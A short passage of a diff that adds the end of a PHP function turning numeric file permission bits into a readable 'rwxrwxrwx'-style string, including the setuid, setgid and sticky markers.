+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
